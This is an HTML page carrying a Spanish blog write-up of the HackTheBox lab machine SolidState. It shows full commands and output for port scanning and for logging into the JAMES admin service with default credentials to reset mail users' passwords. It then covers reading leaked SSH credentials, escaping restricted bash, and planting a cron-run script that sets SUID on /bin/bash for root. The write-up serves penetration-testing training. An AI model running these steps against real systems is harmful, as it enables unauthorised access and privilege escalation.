@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina SolidState - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina SolidState - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hola otra vez, el dia de hoy vamos a resolver la máquina SolidState de la plataforma de hackthebox correspondiente a una maquina linux de dificultad media, la cual vamos a explotar al conectarnos a un servicio de administración que nos permitira cambiar las contraseñas de usuarios de correo, y mediante ello obtendremos unas credenciales para conectarnos al sistema, donde una vez conectados haremos un bypass de una restricted bash asignada y finalmente nos construiremos un script en bash para detectar tareas cron y aprovecharemos una para poder convertinos en el usuario root." />
+<meta property="og:description" content="Hola otra vez, el dia de hoy vamos a resolver la máquina SolidState de la plataforma de hackthebox correspondiente a una maquina linux de dificultad media, la cual vamos a explotar al conectarnos a un servicio de administración que nos permitira cambiar las contraseñas de usuarios de correo, y mediante ello obtendremos unas credenciales para conectarnos al sistema, donde una vez conectados haremos un bypass de una restricted bash asignada y finalmente nos construiremos un script en bash para detectar tareas cron y aprovecharemos una para poder convertinos en el usuario root." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-SolidState" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-SolidState" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-SolidState/banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-24T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-SolidState/banner.png" />
+<meta property="twitter:title" content="Maquina SolidState - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-06-24T00:00:00+00:00","datePublished":"2023-06-24T00:00:00+00:00","description":"Hola otra vez, el dia de hoy vamos a resolver la máquina SolidState de la plataforma de hackthebox correspondiente a una maquina linux de dificultad media, la cual vamos a explotar al conectarnos a un servicio de administración que nos permitira cambiar las contraseñas de usuarios de correo, y mediante ello obtendremos unas credenciales para conectarnos al sistema, donde una vez conectados haremos un bypass de una restricted bash asignada y finalmente nos construiremos un script en bash para detectar tareas cron y aprovecharemos una para poder convertinos en el usuario root.","headline":"Maquina SolidState - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-SolidState/banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-SolidState"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-SolidState"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina SolidState - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-06-24">24 Jun 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-SolidState/banner.png" alt="Maquina SolidState - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Hola otra vez, el dia de hoy vamos a resolver la máquina <code>SolidState</code> de la plataforma de <code>hackthebox</code> correspondiente a una maquina <code>linux</code> de dificultad media, la cual vamos a explotar al conectarnos a un servicio de administración que nos permitira cambiar las contraseñas de usuarios de correo, y mediante ello obtendremos unas credenciales para conectarnos al sistema, donde una vez conectados haremos un bypass de una <code>restricted bash</code> asignada y finalmente nos construiremos un script en bash para detectar tareas <code>cron</code> y aprovecharemos una para poder convertinos en el usuario <code>root</code>.</p>
+
+<p>Vamos a comenzar creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir SolidState
+❯ ls
+ SolidState
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.51
+PING 10.10.10.51 (10.10.10.51) 56(84) bytes of data.
+64 bytes from 10.10.10.51: icmp_seq=1 ttl=63 time=195 ms
+
+--- 10.10.10.51 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 194.687/194.687/194.687/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>63</code>correspondiente a una maquina <code>linux</code>, ahora procederemos a el escaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.51 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 21:26 GMT
+Initiating SYN Stealth Scan at 21:26
+Scanning 10.10.10.51 [65535 ports]
+Discovered open port 25/tcp on 10.10.10.51
+Discovered open port 110/tcp on 10.10.10.51
+Discovered open port 80/tcp on 10.10.10.51
+Discovered open port 22/tcp on 10.10.10.51
+Discovered open port 4555/tcp on 10.10.10.51
+Discovered open port 119/tcp on 10.10.10.51
+Completed SYN Stealth Scan at 21:26, 18.27s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.51
+Host is up, received user-set (0.21s latency).
+Scanned at 2023-06-24 21:26:16 GMT for 18s
+Not shown: 65529 closed tcp ports (reset)
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+25/tcp   open  smtp    syn-ack ttl 63
+80/tcp   open  http    syn-ack ttl 63
+110/tcp  open  pop3    syn-ack ttl 63
+119/tcp  open  nntp    syn-ack ttl 63
+4555/tcp open  rsip    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
+           Raw packets sent: 86905 (3.824MB) | Rcvd: 85777 (3.431MB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 21:27 GMT
+Nmap scan report for 10.10.10.51
+Host is up (0.45s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
+25/tcp   open  smtp    JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.5 [10.10.16.5])
+80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Home - Solid State Security
+|_http-server-header: Apache/2.4.25 (Debian)
+110/tcp  open  pop3    JAMES pop3d 2.3.2
+119/tcp  open  nntp    JAMES nntpd (posting ok)
+4555/tcp open  rsip?
+| fingerprint-strings: 
+|   GenericLines: 
+|     JAMES Remote Administration Tool 2.3.2
+|     Please enter your login and password
+|     Login id:
+|     Password:
+|     Login failed for 
+|_    Login id:
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4555-TCP:V=7.92%I=7%D=6/24%Time=64975FD6%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
+SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
+SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
+Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 291.45 seconds
+
+</code></pre>
+<p>Visulizamos informacion interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 7.4p1 Debian 10+deb9u1</td>
+    </tr>
+    <tr>
+      <td>25</td>
+      <td>SMTP</td>
+      <td>JAMES smtpd 2.3.2</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Apache httpd 2.4.25</td>
+    </tr>
+    <tr>
+      <td>110</td>
+      <td>POP3</td>
+      <td>JAMES pop3d 2.3.2</td>
+    </tr>
+    <tr>
+      <td>119</td>
+      <td>NNTP</td>
+      <td>JAMES nntpd (posting ok)</td>
+    </tr>
+    <tr>
+      <td>4555</td>
+      <td>RSIP?</td>
+      <td>JAMES Remote Administration Tool 2.3.2</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">EXPLOTACION <a href="#explotación">#</a></h2>
+
+<p>Ya que nmap nos reporta el el puerto 4555 un servicio de administración, vamos a tratar de conectarnos.</p>
+
+<pre><code class="language-bash">❯ nc 10.10.10.51 4555
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login id:
+admin
+Password:
+password
+Login failed for admin
+Login id:
+</code></pre>
+<p>Obvervamos que el servicio nos pide unas credenciales, y si fallamos al tratar de conectarnos, pero podemos probar credenciales por defecto, en este caso usaremos <code>root:root</code>.</p>
+
+<pre><code class="language-bash">❯ nc 10.10.10.51 4555
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login id:
+root
+Password:
+root
+Welcome root. HELP for a list of commands
+HELP
+Currently implemented commands:
+help                                    display this help
+listusers                               display existing accounts
+countusers                              display the number of existing accounts
+adduser [username] [password]           add a new user
+verify [username]                       verify if specified user exist
+deluser [username]                      delete existing user
+setpassword [username] [password]       sets a user's password
+setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
+showalias [username]                    shows a user's current email alias
+unsetalias [user]                       unsets an alias for 'user'
+setforwarding [username] [emailaddress] forwards a user's email to another email address
+showforwarding [username]               shows a user's current email forwarding
+unsetforwarding [username]              removes a forward
+user [repositoryname]                   change to another user repository
+shutdown                                kills the current JVM (convenient when James is run as a daemon)
+quit                                    close connection
+</code></pre>
+
+<p>Logramos ingresar al servicio, y podemos ver que tenemos una lista de opciones que podemos usar, entre ellas una que corresponde a listar usuario y cambiarles la contraseña.</p>
+
+<p>Primero vamos a lista a todos los usuarios registrados.</p>
+
+<pre><code class="language-bash">listusers
+Existing accounts 5
+user: james
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+</code></pre>
+<p>Ahora como no sabemos la contraseña de cada uno de estos, usaremos la opcion para modificarles la contraseña y le asignaremos a todos el mismo nombre de usuario.</p>
+
+<pre><code class="language-bash">setpassword james james
+Password for james reset
+setpassword thomas thomas
+Password for thomas reset
+setpassword john john
+Password for john reset
+setpassword mindy mindy
+Password for mindy reset
+setpassword mailadmin mailadmin
+Password for mailadmin reset
+</code></pre>
+
+<p>Como los usuarios corresponden a servicios de correo, vamos a conectarnos para inspeccionar si existe algun mail importante.</p>
+
+<pre><code class="language-bash">❯ telnet 10.10.10.51 110
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+USER james
++OK
+PASS james
++OK Welcome james
+LIST
++OK 0 0
+.
+</code></pre>
+
+<p>Si ahora probamos a conectarnos como el usuario <code>mindy</code>, observamos que tiene dos correos.</p>
+
+<pre><code class="language-bash">❯ telnet 10.10.10.51 110
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+USER mindy
++OK
+PASS mindy
++OK Welcome mindy
+LIST
++OK 2 1945
+1 1109
+2 836
+.
+</code></pre>
+
+<p>Al leer el segundo correo, encontramos unas credenciales para conectarse por <code>ssh</code>.</p>
+
+<pre><code class="language-bash">RETR 2
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+          for &lt;mindy@localhost&gt;;
+          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+</code></pre>
+
+<p>Las credenciales son validas, pero al conectarnos vemos que estamos limitados por una restricted bash.</p>
+
+<pre><code class="language-bash">❯ ssh mindy@10.10.10.51
+The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
+ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
+mindy@10.10.10.51's password: 
+Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
+mindy@solidstate:~$ 
+mindy@solidstate:~$ whoami
+-rbash: whoami: command not found
+mindy@solidstate:~$
+</code></pre>
+
+<p>Ahora como podemos bypasear la <code>restricted bash</code>, pues es muy sencillo; podemos usar como parametro <code>-t bash</code> y de ejecutarse un docker en la maquina nos otorgara una sesión interactiva dentro del contenedor omitiendo las restricciones.</p>
+
+<p>Haciendo uso de lo mencionado, podemos volver a conectarnos y visualizar la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">❯ ssh mindy@10.10.10.51 -t bash
+mindy@10.10.10.51's password: 
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
+mindy
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls
+bin  user.txt
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt 
+5aadb8206e94c4471346a863bf006a4a
+</code></pre>
+
+<h2 id="escalada-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Enumarando el sistema no encontramos información interesante como archivos suid o privilegios de nuestro usuario. Por ello vamos a crearnos un <code>script</code> en bash que nos permita ver tareas que se esten ejecutando en el sistema a intevalos regulares de tiempo al que llamaremos <code>procmon.sh</code>.</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+old_process=$(ps -eo user,command)
+
+while true; do
+  new_process=$(ps -eo user,command)
+  diff &lt;(echo "$old_process") &lt;(echo "$new_process") | grep "[\&gt;\&lt;]" | grep -vE "kworker|procmon|command"
+  old_process=$new_process
+done
+</code></pre>
+
+<p>Ejecutamos el script y despues de unos minutos vemos que el usuario <code>root</code> esta ejecutando un script <code>tmp.py</code>.</p>
+
+<pre><code class="language-bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./procmon.sh 
+&gt; root     /usr/sbin/CRON -f
+&lt; root     /usr/sbin/CRON -f
+c^C
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cd /dev/shm
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ nano procmon.sh
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x procmon.sh 
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./procmon.sh 
+&gt; root     /usr/sbin/CRON -f
+&gt; root     /bin/sh -c python /opt/tmp.py
+&gt; root     python /opt/tmp.py
+&lt; root     /usr/sbin/CRON -f
+&lt; root     /bin/sh -c python /opt/tmp.py
+&lt; root     python /opt/tmp.py
+</code></pre>
+
+<p>Si inspeccionamos los permisos del archivo, podemos ver que tenemos capacidad de escritura, quiere decir que podemos modificarlo y al cabo de unos minutos el usuario <code>root</code> sera el que lo ejecute.</p>
+
+<pre><code class="language-bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /opt/tmp.py 
+-rwxrwxrwx 1 root root 105 Aug 22  2017 /opt/tmp.py
+</code></pre>
+
+<p>Vamos a modificarlo para que al ejecutar otorgue el permiso <code>suid</code> a la bash.</p>
+
+<pre><code class="language-bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ cat /opt/tmp.py
+#!/usr/bin/env python
+import os
+os.system("chmod u+s /bin/bash")
+</code></pre>
+
+<p>Esperamos unos minutos y vemos que ahora la bash ya cuenta con el permisos <code>suid</code>, ahora podemos convertirnos en el usuario <code>root</code> , ir a su directorio personal y visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1265272 May 15  2017 /bin/bash
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ bash -p
+bash-4.4# whoami
+root
+bash-4.4# cd /root/
+bash-4.4# cat root.txt 
+1a0cd964c524d89ebe2a7d630f938518
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina SolidState - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-SolidState" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
